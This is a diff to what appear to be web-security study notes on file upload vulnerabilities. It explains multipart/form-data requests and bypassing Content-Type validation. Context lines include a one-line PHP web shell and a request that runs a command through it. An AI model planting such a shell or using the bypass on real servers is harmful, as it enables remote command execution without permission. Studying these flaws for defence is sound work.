@@ -179,4 +179,39 @@ Allows you to view the content of a file on the filesystem
 Used together to execute arbitrary commands on the target system
 <?php echo system($_GET['command']); ?>
 GET /example/exploit.php?command=whoami HTTP/1.1
+```  
+
+#### Exploiting flawed validation of file upload  
+Modern websites enforce protections against file upload attacks. However, these protection may not be entirely robust, enabling attackers to exploit flaws in these defense mechanism to upload web-shell payloads.  
+
+When submitting HTML forms, the browser usually sends the POST data with the content-type header **application/x-www-form-urlencoded**. However, for large amounts of binary data, like images or documents, this can be inefficient. In this case, **multipart/form-data** is preferred.  
+
+Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this: 
+
 ```
+POST /images HTTP/1.1
+    Host: normal-website.com
+    Content-Length: 12345
+    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="image"; filename="example.jpg"
+    Content-Type: image/jpeg
+
+    [...binary content of example.jpg...]
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="description"
+
+    This is an interesting description of my image.
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="username"
+
+    wiener
+    ---------------------------012345678901234567890123456--
+```
+
+From this, we can see that different fields of the form are separated into parts. Each part contains their own **Content-Disposition** header, providing basic information and the field it belongs to. They may also contain a **Content-Type** header, which tells the server the MIME type of data that was submitted using this input.  
+
+A website may attempt to validate file uploads by checking that the **Content-Type** header matches an expected MIME type. If this check is implicitly trusted by the server, an attacker can modify the field to bypass this validation and upload arbitrary files to the server.
